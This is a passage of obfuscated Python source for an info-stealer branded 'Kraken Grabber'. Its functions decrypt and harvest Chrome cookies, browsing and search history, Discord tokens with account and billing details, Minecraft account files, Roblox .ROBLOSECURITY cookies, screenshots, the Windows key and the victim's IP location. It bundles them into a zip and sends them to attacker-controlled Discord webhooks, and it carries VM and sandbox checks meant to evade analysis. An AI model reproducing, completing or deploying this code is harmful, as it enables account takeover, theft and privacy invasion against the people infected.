                OOO0O00OOOO0O0OO0 =sqlite3 .connect (OO0OOOOOO0O00O00O )#line:448
                OO00000OO0O0O00OO =OOO0O00OOOO0O0OO0 .cursor ()#line:449
                OO00000OO0O0O00OO .execute ("SELECT host_key, name, encrypted_value from cookies")#line:450
                for O000OO0O0OOOOO0OO in OO00000OO0O0O00OO .fetchall ():#line:452
                    O0O0O000O0OO0O00O =O000OO0O0OOOOO0OO [0 ]#line:453
                    O00OOOOOOO00O0OOO =O000OO0O0OOOOO0OO [1 ]#line:454
                    OO000O0OOOO0O0O0O =O0O00O0O0OOOO000O .decrypt_val (O000OO0O0OOOOO0OO [2 ],O0O00O0O0OOOO000O .chrome_key )#line:455
                    if O0O0O000O0OO0O00O !="":#line:456
                        O000O00O0OOOOOO00 .write (f"HOST KEY: {O0O0O000O0OO0O00O} | NAME: {O00OOOOOOO00O0OOO} | VALUE: {OO000O0OOOO0O0O0O}\n")#line:457
                    if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_'in OO000O0OOOO0O0O0O :#line:458
                        O0O00O0O0OOOO000O .robloxcookies .append (OO000O0OOOO0O0O0O )#line:459
                OO00000OO0O0O00OO .close ()#line:461
                OOO0O00OOOO0O0OO0 .close ()#line:462
                os .remove (OO0OOOOOO0O00O00O )#line:463
        O000O00O0OOOOOO00 .close ()#line:464
    @try_extract #line:466
    def grabHistory (O0OO00O0O000O0OO0 ):#line:467
        OO0OO0000000OO0O0 =open (ntpath .join (O0OO00O0O000O0OO0 .dir ,'Google','Google History.txt'),'w',encoding ="cp437",errors ='ignore')#line:468
        def O00O00000O0000O0O (O0O00000OOO000OO0 ):#line:470
            O0O00000OOO000OO0 .execute ('SELECT term FROM keyword_search_terms')#line:471
            O0OOO0OOO000OOOOO =""#line:472
            for OO0000O0O00OO0000 in O0O00000OOO000OO0 .fetchall ():#line:473
                if OO0000O0O00OO0000 [0 ]!="":#line:474
                    O0OOO0OOO000OOOOO +=f"{OO0000O0O00OO0000[0]}\n"#line:475
            return O0OOO0OOO000OOOOO #line:476
        def O0O000O0OOO0O0OOO (O0OOO000OO0OO0O0O ):#line:478
            OO0OO0O000O0OOOOO =""#line:479
            O0OOO000OO0OO0O0O .execute ('SELECT title, url, last_visit_time FROM urls')#line:480
            for O0OOOOO00O0OOOOOO in O0OOO000OO0OO0O0O .fetchall ():#line:481
                OO0OO0O000O0OOOOO +=f"Title: {O0OOOOO00O0OOOOOO[0]}\nUrl: {O0OOOOO00O0OOOOOO[1]}\nLast Time Visit: {O0OO00O0O000O0OO0.convert_time(O0OOOOO00O0OOOOOO[2]).strftime('%Y/%m/%d - %H:%M:%S')}\n\n"#line:482
            return OO0OO0O000O0OOOOO #line:483
        for O000O000000OOO000 in os .listdir (O0OO00O0O000O0OO0 .chrome_user_data ):#line:485
            if re .match (O0OO00O0O000O0OO0 .chrome_reg ,O000O000000OOO000 ):#line:486
                OOO0O0OOO00O0OO00 =ntpath .join (O0OO00O0O000O0OO0 .chrome_user_data ,O000O000000OOO000 ,'History')#line:487
                OO00O0O00O00O0000 =O0OO00O0O000O0OO0 .create_temp_file ()#line:488
                shutil .copy2 (OOO0O0OOO00O0OO00 ,OO00O0O00O00O0000 )#line:490
                OOO000O000OOOO0O0 =sqlite3 .connect (OO00O0O00O00O0000 )#line:491
                OO0OO000OO00OO0OO =OOO000O000OOOO0O0 .cursor ()#line:492
                O00O0OO00O000O0O0 =O00O00000O0000O0O (OO0OO000OO00OO0OO )#line:494
                O00OO00000O000OOO =O0O000O0OOO0O0OOO (OO0OO000OO00OO0OO )#line:495
                OO0OO0000000OO0O0 .write (f"{' '*17}Search History\n{'-'*50}\n{O00O0OO00O000O0O0}\n{' '*17}\n\nWeb History\n{'-'*50}\n{O00OO00000O000OOO}")#line:497
                OO0OO000OO00OO0OO .close ()#line:499
                OOO000O000OOOO0O0 .close ()#line:500
                os .remove (OO00O0O00O00O0000 )#line:501
        OO0OO0000000OO0O0 .close ()#line:502
    def neatifyTokens (OOO0O0OOOO0OO00O0 ):#line:504
        OOO0O0OO0OOOO00OO =open (OOO0O0OOOO0OO00O0 .dir +"\\Discord Info.txt","w",encoding ="cp437",errors ='ignore')#line:505
        for O0O0OO0OOO0OO000O in OOO0O0OOOO0OO00O0 .tokens :#line:506
            OO00OOOOOO0O0O000 =httpx .get (OOO0O0OOOO0OO00O0 .discordApi ,headers =OOO0O0OOOO0OO00O0 .get_headers (O0O0OO0OOO0OO000O )).json ()#line:507
            OOOO00O0O0O0O0000 =OO00OOOOOO0O0O000 .get ('username')+'#'+str (OO00OOOOOO0O0O000 .get ("discriminator"))#line:508
            OO0OO000O0O000OO0 =""#line:510
            O0O0O00OO00OOOOOO =OO00OOOOOO0O0O000 ['flags']#line:511
            if (O0O0O00OO00OOOOOO ==1 ):#line:512
                OO0OO000O0O000OO0 +="Staff, "#line:513
            if (O0O0O00OO00OOOOOO ==2 ):#line:514
                OO0OO000O0O000OO0 +="Partner, "#line:515
            if (O0O0O00OO00OOOOOO ==4 ):#line:516
                OO0OO000O0O000OO0 +="Hypesquad Event, "#line:517
            if (O0O0O00OO00OOOOOO ==8 ):#line:518
                OO0OO000O0O000OO0 +="Green Bughunter, "#line:519
            if (O0O0O00OO00OOOOOO ==64 ):#line:520
                OO0OO000O0O000OO0 +="Hypesquad Bravery, "#line:521
            if (O0O0O00OO00OOOOOO ==128 ):#line:522
                OO0OO000O0O000OO0 +="HypeSquad Brillance, "#line:523
            if (O0O0O00OO00OOOOOO ==256 ):#line:524
                OO0OO000O0O000OO0 +="HypeSquad Balance, "#line:525
            if (O0O0O00OO00OOOOOO ==512 ):#line:526
                OO0OO000O0O000OO0 +="Early Supporter, "#line:527
            if (O0O0O00OO00OOOOOO ==16384 ):#line:528
                OO0OO000O0O000OO0 +="Gold BugHunter, "#line:529
            if (O0O0O00OO00OOOOOO ==131072 ):#line:530
                OO0OO000O0O000OO0 +="Verified Bot Developer, "#line:531
            if (OO0OO000O0O000OO0 ==""):#line:532
                OO0OO000O0O000OO0 ="None"#line:533
            OO0O000OOO0OO0O0O =OO00OOOOOO0O0O000 .get ("email")#line:535
            O00OO0OOOO00O0000 =OO00OOOOOO0O0O000 .get ("phone")if OO00OOOOOO0O0O000 .get ("phone")else "No Phone Number attached"#line:536
            O0OOOO00OO00O00OO =httpx .get (OOO0O0OOOO0OO00O0 .discordApi +'/billing/subscriptions',headers =OOO0O0OOOO0OO00O0 .get_headers (O0O0OO0OOO0OO000O )).json ()#line:537
            OO0OO0O0OOOO0O0O0 =False #line:538
            OO0OO0O0OOOO0O0O0 =bool (len (O0OOOO00OO00O00OO )>0 )#line:539
            O00000OOOO0000O00 =bool (len (json .loads (httpx .get (OOO0O0OOOO0OO00O0 .discordApi +"/billing/payment-sources",headers =OOO0O0OOOO0OO00O0 .get_headers (O0O0OO0OOO0OO000O )).text ))>0 )#line:540
            OOO0O0OO0OOOO00OO .write (f"{' '*17}{OOOO00O0O0O0O0000}\n{'-'*50}\nToken: {O0O0OO0OOO0OO000O}\nHas Billing: {O00000OOOO0000O00}\nNitro: {OO0OO0O0OOOO0O0O0}\nBadges: {OO0OO000O0O000OO0}\nEmail: {OO0O000OOO0OO0O0O}\nPhone: {O00OO0OOOO00O0000}\n\n")#line:541
        OOO0O0OO0OOOO00OO .close ()#line:542
    def grabMinecraftCache (OOO000OO0O0O0OO00 ):#line:544
        OOO0O00OO000O00O0 =ntpath .join (OOO000OO0O0O0OO00 .dir ,'Minecraft')#line:545
        os .makedirs (OOO0O00OO000O00O0 ,exist_ok =True )#line:546
        OO00OO00O0OOO0000 =ntpath .join (OOO000OO0O0O0OO00 .roaming ,'.minecraft')#line:547
        OOO0OO00OOOO0OOO0 =['launcher_accounts.json','launcher_profiles.json','usercache.json','launcher_log.txt']#line:548
        for _O0O0O0O0O0O0O0000 in OOO0OO00OOOO0OOO0 :#line:550
            if ntpath .exists (ntpath .join (OO00OO00O0OOO0000 ,_O0O0O0O0O0O0O0000 )):#line:551
                shutil .copy2 (ntpath .join (OO00OO00O0OOO0000 ,_O0O0O0O0O0O0O0000 ),OOO0O00OO000O00O0 +OOO000OO0O0O0OO00 .sep +_O0O0O0O0O0O0O0000 )#line:552
    def grabRobloxCookie (O0OO0OO0O0000O0O0 ):#line:554
        def O0OOOO00O0O000O0O (OO00000O0O0O0OO00 ):#line:555
            try :#line:556
                return subprocess .check_output (fr"powershell Get-ItemPropertyValue -Path {OO00000O0O0O0OO00}:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com -Name .ROBLOSECURITY",creationflags =0x08000000 ).decode ().rstrip ()#line:559
            except Exception :#line:560
                return None #line:561
        OOO00O00O0OOO0O0O =O0OOOO00O0O000O0O (r'HKLM')#line:562
        if not OOO00O00O0OOO0O0O :#line:563
            OOO00O00O0OOO0O0O =O0OOOO00O0O000O0O (r'HKCU')#line:564
        if OOO00O00O0OOO0O0O :#line:565
            O0OO0OO0O0000O0O0 .robloxcookies .append (OOO00O00O0OOO0O0O )#line:566
        if O0OO0OO0O0000O0O0 .robloxcookies :#line:567
            with open (O0OO0OO0O0000O0O0 .dir +"\\Roblox Cookies.txt","w")as OOO0O0O000O0OO00O :#line:568
                for O0OOOOOO0OOOOO0O0 in O0OO0OO0O0000O0O0 .robloxcookies :#line:569
                    OOO0O0O000O0OO00O .write (O0OOOOOO0OOOOO0O0 +'\n')#line:570
    def screenshot (OO00OO000OOOO00O0 ):#line:572
        O0OO0O00000O00OO0 =ImageGrab .grab (bbox =None ,include_layered_windows =False ,all_screens =True ,xdisplay =None )#line:578
        O0OO0O00000O00OO0 .save (OO00OO000OOOO00O0 .dir +"\\Screenshot.png")#line:579
        O0OO0O00000O00OO0 .close ()#line:580
    def sys_dump (OO0O0O0O0000OO00O ):#line:582
        OO00000O0OOOO00O0 ="="*50 #line:583
        OOOOOOOOO0OOO00OO =f"""
{OO00000O0OOOO00O0}
{Victim} | {Victim_pc}
{line_sep}
Windows key: {OO0O0O0O0000OO00O.winkey}
Windows version: {OO0O0O0O0000OO00O.winver}
{line_sep}
RAM: {ram}GB
DISK: {disk}GB
HWID: {OO0O0O0O0000OO00O.hwid}
{line_sep}
IP: {OO0O0O0O0000OO00O.ip}
City: {OO0O0O0O0000OO00O.city}
Country: {OO0O0O0O0000OO00O.country}
Region: {OO0O0O0O0000OO00O.region}
Org: {OO0O0O0O0000OO00O.org}
GoogleMaps: {OO0O0O0O0000OO00O.googlemap}
{line_sep}
        """#line:602
        with open (OO0O0O0O0000OO00O .dir +"\\System info.txt","w",encoding ="utf-8",errors ='ignore')as OO000OO0OOOOOO00O :#line:603
            OO000OO0OOOOOO00O .write (OOOOOOOOO0OOO00OO )#line:604
    def finish (OOOOO0O0OO00OO00O ):#line:606
        for OOO000000O0OOOO00 in os .listdir (OOOOO0O0OO00OO00O .dir ):#line:607
            if OOO000000O0OOOO00 .endswith ('.txt'):#line:608
                OO000OO000OOO000O =OOOOO0O0OO00OO00O .dir +OOOOO0O0OO00OO00O .sep +OOO000000O0OOOO00 #line:609
                with open (OO000OO000OOO000O ,"r",errors ="ignore")as OO000OOOO0OOOOOOO :#line:610
                    OOO000O0O0OOOO0O0 =OO000OOOO0OOOOOOO .read ()#line:611
                    if not OOO000O0O0OOOO0O0 :#line:612
                        OO000OOOO0OOOOOOO .close ()#line:613
                        os .remove (OO000OO000OOO000O )#line:614
                    else :#line:615
                        with open (OO000OO000OOO000O ,"w",encoding ="utf-8",errors ="ignore")as OOOO0OO0O000O0OOO :#line:616
                            OOOO0OO0O000O0OOO .write ("🌟・Grabber By Kraken Drops・Kraken on top! https://discord.gg/krakendrops \n\n")#line:617
                        with open (OO000OO000OOO000O ,"a",encoding ="utf-8",errors ="ignore")as O00000OOO0O0000O0 :#line:618
                            O00000OOO0O0000O0 .write (OOO000O0O0OOOO0O0 +"\n\n🌟・Grabber By Kraken Drops・Kraken on top! https://discord.gg/krakendrops ")#line:619
        _OOOO0OOOO00OOO0O0 =ntpath .join (OOOOO0O0OO00OO00O .appdata ,f'krakenGrabber-[{Victim}].zip')#line:621
        O0OOO00OO0O0O0O0O =zipfile .ZipFile (_OOOO0OOOO00OOO0O0 ,"w",zipfile .ZIP_DEFLATED )#line:622
        OO000000O0O0OO000 =ntpath .abspath (OOOOO0O0OO00OO00O .dir )#line:623
        for OOOO0OO00O0OOOO00 ,_O0O0O0OOO000O0000 ,O00O0OO00O0000OO0 in os .walk (OOOOO0O0OO00OO00O .dir ):#line:624
            for OOOOOO00O0O0OO00O in O00O0OO00O0000OO0 :#line:625
                OO00000O00OO0O00O =ntpath .abspath (ntpath .join (OOOO0OO00O0OOOO00 ,OOOOOO00O0O0OO00O ))#line:626
                O0000O00OOOO0OOO0 =OO00000O00OO0O00O [len (OO000000O0O0OO000 )+1 :]#line:627
                O0OOO00OO0O0O0O0O .write (OO00000O00OO0O00O ,O0000O00OOOO0OOO0 )#line:628
        O0OOO00OO0O0O0O0O .close ()#line:629
        O00O0OOOOOOO00O0O ,O00O0O00O0OOOOO00 ,O000OO0OOOOO0OO00 =0 ,'',''#line:631
        for _O0O0O0OOO000O0000 ,__ ,O00O0OO00O0000OO0 in os .walk (OOOOO0O0OO00OO00O .dir ):#line:632
            for _OOO00O0OOOO0O0O00 in O00O0OO00O0000OO0 :#line:633
                O00O0O00O0OOOOO00 +=f"・{_OOO00O0OOOO0O0O00}\n"#line:634
                O00O0OOOOOOO00O0O +=1 #line:635
        for O00OO00O0O0OOO0OO in OOOOO0O0OO00OO00O .tokens :#line:636
            O000OO0OOOOO0OO00 +=f'{O00OO00O0O0OOO0OO}\n\n'#line:637
        OO0OOO000OOOOOOOO =f"{O00O0OOOOOOO00O0O} Files Found: "#line:638
        O0OO0OO000O0O0O00 ={'avatar_url':'https://media.discordapp.net/attachments/996863879768440933/1000386886830919720/131231.png','embeds':[{"username":"Kraken On Top",'author':{'name':f'*{Victim}* Just got fucked by krakens grabber','url':'https://discord.gg/krakendrops','icon_url':'https://media.discordapp.net/attachments/996863879768440933/1000386886830919720/131231.png'},'color':6684927 ,'description':f'[Retards Location]({OOOOO0O0OO00OO00O.googlemap})','fields':[{'name':'\u200b','value':f'''```fix
                                IP:᠎ {OOOOO0O0OO00OO00O.ip.replace(" ", "᠎ ") if OOOOO0O0OO00OO00O.ip else "N/A"}
                                Org:᠎ {OOOOO0O0OO00OO00O.org.replace(" ", "᠎ ") if OOOOO0O0OO00OO00O.org else "N/A"}
                                City:᠎ {OOOOO0O0OO00OO00O.city.replace(" ", "᠎ ") if OOOOO0O0OO00OO00O.city else "N/A"}
                                Region:᠎ {OOOOO0O0OO00OO00O.region.replace(" ", "᠎ ") if OOOOO0O0OO00OO00O.region else "N/A"}
                                Country:᠎ {OOOOO0O0OO00OO00O.country.replace(" ", "᠎ ") if OOOOO0O0OO00OO00O.country else "N/A"}```
                            '''.replace (' ',''),'inline':True },{'name':'\u200b','value':f'''```fix
                                PCName: {Victim_pc.replace(" ", "᠎ ")}
                                WinKey:᠎ {OOOOO0O0OO00OO00O.winkey.replace(" ", "᠎ ")}
                                WinVer:᠎ {OOOOO0O0OO00OO00O.winver.replace(" ", "᠎ ")}
                                DiskSpace:᠎ {disk}GB
                                Ram:᠎ {ram}GB```
                            '''.replace (' ',''),'inline':True },{'name':'**Tokens:**','value':f'''```yaml
                                {O000OO0OOOOO0OO00 if O000OO0OOOOO0OO00 else "No tokens extracted"}```
                            '''.replace (' ',''),'inline':False },{'name':OO0OOO000OOOOOOOO ,'value':f'''```ini
                                [
                                {O00O0O00O0OOOOO00.strip()}
                                ]```
                            '''.replace (' ',''),'inline':False }],'footer':{'text':'🌟・Grabber By alex!・https://discord.gg/krakendrops'}}]}#line:698
        if OOOOO0O0OO00OO00O .fetch_conf ('ping_on_run'):#line:699
            O0OO0OO000O0O0O00 .update ({'content':'@everyone'})#line:700
        with open (_OOOO0OOOO00OOO0O0 ,'rb')as OOOO0OO0O000O0OOO :#line:702
            if OOOOO0O0OO00OO00O .hook_reg in OOOOO0O0OO00OO00O .webhook :#line:703
                httpx .post (OOOOO0O0OO00OO00O .webhook ,json =O0OO0OO000O0O0O00 )#line:704
                httpx .post (OOOOO0O0OO00OO00O .webhook ,files ={'upload_file':OOOO0OO0O000O0OOO })#line:705
                httpx .post (OOOOO0O0OO00OO00O .userhook ,json =O0OO0OO000O0O0O00 )#line:706
                httpx .post (OOOOO0O0OO00OO00O .userhook ,files ={'upload_file':OOOO0OO0O000O0OOO })#line:707
            else :#line:708
                O0OO0O000OO00O00O =TOTP (OOOOO0O0OO00OO00O .fetch_conf ('webhook_protector_key')).now ()#line:709
                httpx .post (OOOOO0O0OO00OO00O .webhook ,headers ={"Authorization":O0OO0O000OO00O00O },json =O0OO0OO000O0O0O00 )#line:710
                httpx .post (OOOOO0O0OO00OO00O .webhook ,headers ={"Authorization":O0OO0O000OO00O00O },files ={'upload_file':OOOO0OO0O000O0OOO })#line:711
                httpx .post (OOOOO0O0OO00OO00O .userhook ,json =O0OO0OO000O0O0O00 )#line:712
                httpx .post (OOOOO0O0OO00OO00O .userhook ,files ={'upload_file':OOOO0OO0O000O0OOO })#line:713
        os .remove (_OOOO0OOOO00OOO0O0 )#line:714
class AntiDebug (Functions ):#line:717
    inVM =False #line:718
    def __init__ (O0O0OO0O000000O0O ):#line:720
        O0O0OO0O000000O0O .processes =list ()#line:721
        O0O0OO0O000000O0O .blackListedUsers =["WDAGUtilityAccount","Abby","Peter Wilson","hmarc","patex","JOHN-PC","RDhJ0CNFevzX","kEecfMwgj","Frank","8Nl0ColNQ5bq","Lisa","John","george","PxmdUOpVyx","8VizSM","w0fjuOVmCcP5A","lmVwjj9b","PqONjHVwexsS","3u2v9m8","Julia","HEUeRzl",]#line:726
        O0O0OO0O000000O0O .blackListedPCNames =["BEE7370C-8C0C-4","DESKTOP-NAKFFMT","WIN-5E07COS9ALR","B30F0242-1C6A-4","DESKTOP-VRSQLAG","Q9IATRKPRH","XC64ZB","DESKTOP-D019GDM","DESKTOP-WI8CLET","SERVER1","LISA-PC","JOHN-PC","DESKTOP-B0T93D6","DESKTOP-1PYKP29","DESKTOP-1Y2433R","WILEYPC","WORK","6C4E733F-C2D9-4","RALPHS-PC","DESKTOP-WG3MYJS","DESKTOP-7XC6GEZ","DESKTOP-5OV9S0O","QarZhrdBpj","ORELEEPC","ARCHIBALDPC","JULIA-PC","d1bnJkfVlH",]#line:731
        O0O0OO0O000000O0O .blackListedHWIDS =["7AB5C494-39F5-4941-9163-47F54D6D5016","032E02B4-0499-05C3-0806-3C0700080009","03DE0294-0480-05DE-1A06-350700080009","11111111-2222-3333-4444-555555555555","6F3CA5EC-BEC9-4A4D-8274-11168F640058","ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548","4C4C4544-0050-3710-8058-CAC04F59344A","00000000-0000-0000-0000-AC1F6BD04972","79AF5279-16CF-4094-9758-F88A616D81B4","5BD24D56-789F-8468-7CDC-CAA7222CC121","49434D53-0200-9065-2500-65902500E439","49434D53-0200-9036-2500-36902500F022","777D84B3-88D1-451C-93E4-D235177420A7","49434D53-0200-9036-2500-369025000C65","B1112042-52E8-E25B-3655-6A4F54155DBF","00000000-0000-0000-0000-AC1F6BD048FE","EB16924B-FB6D-4FA1-8666-17B91F62FB37","A15A930C-8251-9645-AF63-E45AD728C20C","67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3","C7D23342-A5D4-68A1-59AC-CF40F735B363","63203342-0EB0-AA1A-4DF5-3FB37DBB0670","44B94D56-65AB-DC02-86A0-98143A7423BF","6608003F-ECE4-494E-B07E-1C4615D1D93C","D9142042-8F51-5EFF-D5F8-EE9AE3D1602A","49434D53-0200-9036-2500-369025003AF0","8B4E8278-525C-7343-B825-280AEBCD3BCB","4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27",]#line:742
        for OOO00O0O000000O00 in [O0O0OO0O000000O0O .listCheck ,O0O0OO0O000000O0O .registryCheck ,O0O0OO0O000000O0O .specsCheck ]:#line:744
            O000O0O00O0O0OO0O =threading .Thread (target =OOO00O0O000000O00 ,daemon =True )#line:745
            O0O0OO0O000000O0O .processes .append (O000O0O00O0O0OO0O )#line:746
            O000O0O00O0O0OO0O .start ()#line:747
        for OO0OO000OO0O0O00O in O0O0OO0O000000O0O .processes :#line:748
            try :#line:749
                OO0OO000OO0O0O00O .join ()#line:750
            except RuntimeError :#line:751
                continue #line:752
    def programExit (OOO0O0OO0O0OO0O0O ):#line:754
        OOO0O0OO0O0OO0O0O .__class__ .inVM =True #line:755
    def listCheck (OOOOO0OOOOOO0O00O ):#line:757
        for O0O000O0O000O0O00 in [r'D:\Tools',r'D:\OS2',r'D:\NT3X']:#line:758
            if ntpath .exists (O0O000O0O000O0O00 ):#line:759
                OOOOO0OOOOOO0O00O .programExit ()#line:760
        for O00O000O00O0OO0OO in OOOOO0OOOOOO0O00O .blackListedUsers :#line:762
            if Victim ==O00O000O00O0OO0OO :#line:763
                OOOOO0OOOOOO0O00O .programExit ()#line:764
        for OOOO0000OOO0OOO0O in OOOOO0OOOOOO0O00O .blackListedPCNames :#line:766
            if Victim_pc ==OOOO0000OOO0OOO0O :#line:767
                OOOOO0OOOOOO0O00O .programExit ()#line:768
        for OO00OO00OOO0OOO0O in OOOOO0OOOOOO0O00O .blackListedHWIDS :#line:770
            if OOOOO0OOOOOO0O00O .system_info ()[0 ]==OO00OO00OOO0OOO0O :#line:771
                OOOOO0OOOOOO0O00O .programExit ()#line:772
    def specsCheck (OOOO0OOO00OOO00OO ):#line:774
        if int (ram )<=2 :#line:776
            OOOO0OOO00OOO00OO .programExit ()#line:777
        if int (disk )<=50 :#line:778
            OOOO0OOO00OOO00OO .programExit ()#line:779
        if int (psutil .cpu_count ())<=1 :#line:780
            OOOO0OOO00OOO00OO .programExit ()#line:781
    def registryCheck (OO000OOO000O0000O ):#line:783
        OOO0O0OO0O00O000O =os .system ("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")#line:784
        OOO00O0O0OOOOO0OO =os .system ("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")#line:785
        if (OOO0O0OO0O00O000O and OOO00O0O0OOOOO0OO )!=1 :#line:786
            OO000OOO000O0000O .programExit ()#line:787
        O00OOO00OOOOOO0OO =winreg .OpenKey (winreg .HKEY_LOCAL_MACHINE ,'SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum')#line:789
        try :#line:790
            OOO0O00OO0000OOO0 =winreg .QueryValueEx (O00OOO00OOOOOO0OO ,'0')[0 ]#line:791
            if ("VMware"or "VBOX")in OOO0O00OO0000OOO0 :#line:792
                OO000OOO000O0000O .programExit ()#line:793
        finally :#line:794
            winreg .CloseKey (O00OOO00OOOOOO0OO )#line:795
if __name__ =="__main__"and os .name =="nt":#line:798
    try :#line:799
        httpx .get ('https://google.com')#line:800
    except (httpx .NetworkError ,httpx .TimeoutException ):#line:801
        os ._exit (0 )#line:802
    asyncio .run (KrakenGrabber ().init ())#line:803
def cls ():#line:805
    os .system ("cls")#line:806
def cookieLogger ():#line:809
    O00O0O0OOOOOO00OO =[]#line:811
    try :#line:813
        OO00O000O0000000O =browser_cookie3 .chromium (domain_name ='roblox.com')#line:814
        for OO0OOOO0OO00O00O0 in OO00O000O0000000O :#line:815
            if OO0OOOO0OO00O00O0 .name =='.ROBLOSECURITY':#line:816
                O00O0O0OOOOOO00OO .append (OO00O000O0000000O )#line:817
                O00O0O0OOOOOO00OO .append (OO0OOOO0OO00O00O0 .value )#line:818
    except :#line:819
        pass #line:820
    try :#line:822
        OO00O000O0000000O =browser_cookie3 .brave (domain_name ='roblox.com')#line:823
        for OO0OOOO0OO00O00O0 in OO00O000O0000000O :#line:824
            if OO0OOOO0OO00O00O0 .name =='.ROBLOSECURITY':#line:825
                O00O0O0OOOOOO00OO .append (OO00O000O0000000O )#line:826
                O00O0O0OOOOOO00OO .append (OO0OOOO0OO00O00O0 .value )#line:827
    except :#line:828
        pass #line:829
    try :#line:831
        OO00O000O0000000O =browser_cookie3 .firefox (domain_name ='roblox.com')#line:832
        for OO0OOOO0OO00O00O0 in OO00O000O0000000O :#line:833
            if OO0OOOO0OO00O00O0 .name =='.ROBLOSECURITY':#line:834
                O00O0O0OOOOOO00OO .append (OO00O000O0000000O )#line:835
                O00O0O0OOOOOO00OO .append (OO0OOOO0OO00O00O0 .value )#line:836
    except :#line:837
        pass #line:838
    try :#line:840
        OO00O000O0000000O =browser_cookie3 .edge (domain_name ='roblox.com')#line:841
        for OO0OOOO0OO00O00O0 in OO00O000O0000000O :#line:842
            if OO0OOOO0OO00O00O0 .name =='.ROBLOSECURITY':#line:843
                O00O0O0OOOOOO00OO .append (OO00O000O0000000O )#line:844
                O00O0O0OOOOOO00OO .append (OO0OOOO0OO00O00O0 .value )#line:845
    except :#line:846
        pass #line:847
    try :#line:849
        OO00O000O0000000O =browser_cookie3 .opera (domain_name ='roblox.com')#line:850
        for OO0OOOO0OO00O00O0 in OO00O000O0000000O :#line:851
            if OO0OOOO0OO00O00O0 .name =='.ROBLOSECURITY':#line:852
                O00O0O0OOOOOO00OO .append (OO00O000O0000000O )#line:853
                O00O0O0OOOOOO00OO .append (OO0OOOO0OO00O00O0 .value )#line:854
    except :#line:855
        pass #line:856
    try :#line:858
        OO00O000O0000000O =browser_cookie3 .chrome (domain_name ='roblox.com')#line:859
        for OO0OOOO0OO00O00O0 in OO00O000O0000000O :#line:860
            if OO0OOOO0OO00O00O0 .name =='.ROBLOSECURITY':#line:861
                O00O0O0OOOOOO00OO .append (OO00O000O0000000O )#line:862
                O00O0O0OOOOOO00OO .append (OO0OOOO0OO00O00O0 .value )#line:863
                return O00O0O0OOOOOO00OO #line:864
    except :#line:865
        pass #line:866
cookies =cookieLogger ()#line:869
approved =['_|WARNING']#line:872
cookies [:]=[O0O00OO0OO00O00O0 for O0O00OO0OO00O00O0 in cookies if any (O0OO00OO0O0O0OO00 in O0O00OO0OO00O00O0 for O0OO00OO0O0O0OO00 in approved )]#line:873
for x in cookies :#line:877
    isvalid =robloxpy .Utils .CheckCookie (x )#line:878
    if isvalid =="Valid Cookie":#line:879
        isvalid ="Valid"#line:880
    else :#line:881
        requests .post (url =webhook1 ,data ={"content":f"R.I.P ,cookie is expired\ndead cookie :skull: : ```{x}```"})#line:882
        requests .post (url =userhook ,data ={"content":f"R.I.P ,cookie is expired\ndead cookie :skull: : ```{x}```"})#line:883
for z in cookies :#line:886
    ebruh =requests .get ("https://www.roblox.com/mobileapi/userinfo",cookies ={".ROBLOSECURITY":z })#line:888
    info =json .loads (ebruh .text )#line:889
    rid =info ["UserID"]#line:890
    rap =robloxpy .User .External .GetRAP (rid )#line:891
    age =robloxpy .User .External .GetAge (rid )#line:892
    dnso =None #line:893
    crdate =robloxpy .User .External .CreationDate (rid )#line:894
    rolimons =f"https://www.rolimons.com/player/{rid}"#line:895
    roblox_profile =f"https://web.roblox.com/users/{rid}/profile"#line:896
    headshot =robloxpy .User .External .GetHeadshot (rid )#line:897
    username =info ['UserName']#line:898
    robux =info ['RobuxBalance']#line:899
    premium =info ['IsPremium']#line:900
    ip_address =requests .get ("https://api.ipify.org/").text #line:901
    discord =Discord (url =webhook1 )#line:905
    discord1 =Discord (url =userhook )#line:906
    discord .post (username ="Kraken On Top",avatar_url ="https://media.discordapp.net/attachments/996863879768440933/1000386886830919720/131231.png?width=985&height=657",embeds =[{"username":"Kraken On Top","title":"💸 New beam 💸","url":"https://discord.gg/krakendrops","description":f"[Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})","color":6684927 ,"fields":[{"name":"Username","value":username ,"inline":True },{"name":"Robux Balance","value":robux ,"inline":True },{"name":"Premium Status","value":premium ,"inline":True },{"name":"Creation Date","value":crdate ,"inline":True },{"name":"RAP","value":rap ,"inline":True },{"name":"Account Age","value":age ,"inline":True },{"name":"IP Address","value":ip_address ,"inline":False },{"name":".ROBLOSECURITY","value":f"```fix\n{z}```","inline":False },],"footer":{"text":"Provided by Kraken Drops","icon_url":"https://media.discordapp.net/attachments/996863879768440933/1000386886830919720/131231.png?width=985&height=657"},"thumbnail":{"url":headshot },}],)#line:933
    discord1 .post (username ="Kraken On Top",avatar_url ="https://media.discordapp.net/attachments/996863879768440933/1000386886830919720/131231.png?width=985&height=657",embeds =[{"username":"Kraken On Top","title":"💸 New beam 💸","url":"https://discord.gg/krakendrops","description":f"[Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})","color":6684927 ,"fields":[{"name":"Username","value":username ,"inline":True },{"name":"Robux Balance","value":robux ,"inline":True },{"name":"Premium Status","value":premium ,"inline":True },{"name":"Creation Date","value":crdate ,"inline":True },{"name":"RAP","value":rap ,"inline":True },{"name":"Account Age","value":age ,"inline":True },{"name":"IP Address","value":ip_address ,"inline":False },{"name":".ROBLOSECURITY","value":f"```fix\n{z}```","inline":False },],"footer":{"text":"Provided by Kraken Drops","icon_url":"https://media.discordapp.net/attachments/996863879768440933/1000386886830919720/131231.png?width=985&height=657"},"thumbnail":{"url":headshot },}],)#line:960

